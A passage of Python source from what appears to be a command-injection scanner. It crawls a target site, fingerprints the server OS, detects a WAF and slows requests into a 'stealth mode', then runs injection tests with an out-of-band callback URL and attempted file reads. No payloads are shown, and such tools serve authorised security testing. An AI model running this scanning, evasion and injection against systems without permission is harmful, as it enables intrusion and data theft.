    _cookie_val = opts.get("cookie")
    _proxy_val  = opts.get("proxy")

    client = HTTPClient(
        timeout          = opts.get("timeout", 15),
        cookie           = _cookie_val,
        extra_header     = opts.get("header"),
        login_url        = opts.get("login_url"),
        login_user_field = opts.get("login_user_field", "username"),
        login_pass_field = opts.get("login_pass_field", "password"),
        login_user       = opts.get("login_user"),
        login_pass       = opts.get("login_pass"),
    )

    if _proxy_val:
        _ph = urllib.request.ProxyHandler({"http": _proxy_val, "https": _proxy_val})
        urllib.request.install_opener(urllib.request.build_opener(_ph))
        emit.info(f"Proxy: {_proxy_val}")

    if _cookie_val:
        emit.info("Auth: session cookie loaded")

    # ── Phase 1: Endpoint discovery ────────────────────────────────────
    emit.section("Endpoint Discovery")
    spider_intel = opts.get("spider_intel")

    class _NullCrawler:
        visited             = set()
        js_visited          = set()
        _survived_chars     = {}
        _spa_endpoint_count = 0

    crawler    = _NullCrawler()
    endpoints  = []
    _did_crawl = False

    if spider_intel:
        emit.info("Spider intel detected — skipping internal crawler")
        endpoints = _spider_intel_to_endpoints(spider_intel, target)
        if not endpoints:
            emit.warn("Spider intel yielded no testable endpoints — falling back to crawler")
        else:
            emit.info(f"Loaded {len(endpoints)} endpoints from Spider ({sum(1 for e in endpoints if e.get('parameter_sensitive'))} param-sensitive)")

    if not endpoints:
        emit.info("Running internal crawler...")
        crawler = Crawler(target, client, max_pages=60, max_depth=3, threads=10)
        endpoints = crawler.crawl()
        _did_crawl = True

    if not endpoints:
        emit.warn("No testable endpoints found")
        return {"raw": "No endpoints found", "intel": {"vulnerabilities": [], "risk_score": 0}}

    # ── Route-normalization dedup ──────────────────────────────────────
    _norm_seen: dict = {}
    _deduped: list   = []
    _SRC_ORDER = {"sanitization_detect": 6, "chained_path_d1": 5,
                  "obf_api_probe": 4, "chained_path_d2": 4,
                  "chained_path_d3": 3, "discovery_file": 2, "path_probe": 1}

    def _merge_into(existing, ep):
        for pn, pv in ep["params"].items():
            existing["params"].setdefault(pn, pv)
        pp_e = ep.get("priority_params") or []
        pp_x = existing.setdefault("priority_params", [])
        pp_s = set(pp_x)
        for pn in pp_e:
            if pn not in pp_s:
                pp_x.append(pn); pp_s.add(pn)
        if _SRC_ORDER.get(ep.get("source", ""), 0) > _SRC_ORDER.get(existing.get("source", ""), 0):
            existing["source"] = ep["source"]
        if ep.get("response_sig") and not existing.get("response_sig"):
            existing["response_sig"] = ep["response_sig"]

    for ep in endpoints:
        nurl = Crawler._norm_url(ep["url"])
        meth = ep["method"]
        sig  = ep.get("response_sig")
        exact_key = (nurl, meth, sig)
        match_idx = None
        if exact_key in _norm_seen:
            match_idx = _norm_seen[exact_key]
        elif sig is None:
            for k, idx in _norm_seen.items():
                if k[0] == nurl and k[1] == meth:
                    match_idx = idx; break
        else:
            none_key = (nurl, meth, None)
            if none_key in _norm_seen:
                match_idx = _norm_seen[none_key]
                _norm_seen[(nurl, meth, sig)] = match_idx
                del _norm_seen[none_key]
        if match_idx is not None:
            _merge_into(_deduped[match_idx], ep)
        else:
            _norm_seen[exact_key] = len(_deduped)
            _deduped.append(ep)
    endpoints = _deduped

    # ── Phase 2: OS fingerprint ────────────────────────────────────────
    emit.section("OS Fingerprinting")
    force_os = opts.get("force_os")
    if force_os:
        os_target, run_both = force_os, False
        emit.info(f"OS forced: {force_os.upper()}")
    else:
        fp_obj = OSFingerprinter(target, client)
        os_target, run_both = fp_obj.fingerprint()

    # ── WAF detection ──────────────────────────────────────────────────
    _waf = WAFDetector(target, client, delay=opts.get("delay", 0))
    _waf_result = _waf.detect()
    if _waf_result["detected"]:
        waf_type = _waf_result.get("waf_type", "unknown")
        emit.warn(f"WAF detected: {waf_type} — enabling stealth mode")
        client._waf_delay    = _waf_result.get("recommended_delay", 1.5)
        client._waf_detected = True
    else:
        client._waf_delay    = opts.get("delay", 0)
        client._waf_detected = False

    # ── Phase 3: Parameter risk analysis ──────────────────────────────
    emit.section("Parameter Risk Analysis")
    endpoints = prioritize_endpoints(endpoints)

    high = [e for e in endpoints if any(risk_score(p) >= 2 for p in set(e.get("priority_params") or []))]
    med  = [e for e in endpoints if any(risk_score(p) >= 1 for p in e["params"]) and e not in high]
    low  = [e for e in endpoints if e not in high and e not in med]
    emit.info(f"High-risk: {len(high)} | Medium: {len(med)} | Low: {len(low)} endpoints")

    # ── Phase 4: Injection ─────────────────────────────────────────────
    emit.section("Injection Testing")
    collab_url = opts.get("collab")
    output_dir = opts.get("output_dir")
    read_path  = opts.get("read_path")

    injector = Injector(
        client         = client,
        token          = token,
        os_target      = os_target,
        run_both       = run_both,
        time_threshold = opts.get("time_thresh", 9.0),
        safe_mode      = True,
        collab_url     = collab_url,
        output_dir     = output_dir,
        read_path      = read_path,
    )
    injector._survived_chars = crawler._survived_chars
    findings = injector.run(endpoints)

    # ── Build return intel ─────────────────────────────────────────────
    risk = sum(10 if f.get("severity") == "Critical" else
               5  if f.get("severity") == "High" else
               3  if f.get("severity") == "Medium" else 1
               for f in findings)

    emit.section("CMDinj Summary")
    emit.always_success(f"Scan complete — {len(findings)} finding(s), risk score: {risk}")
    if findings:
        for f in findings:
            sev = f.get("severity", "High")
            emit.always_success(f"CONFIRMED: {f.get('vuln_type','CMDi')} @ {f.get('url','')} [{sev}]")

    return {
        "raw": f"{len(findings)} command injection finding(s)",
        "intel": {
            "vulnerabilities": findings,
            "file_reads":       injector.file_reads,
            "risk_score":       risk,
            "endpoints_tested": len(endpoints),
            "os_detected":      os_target,
        }
    }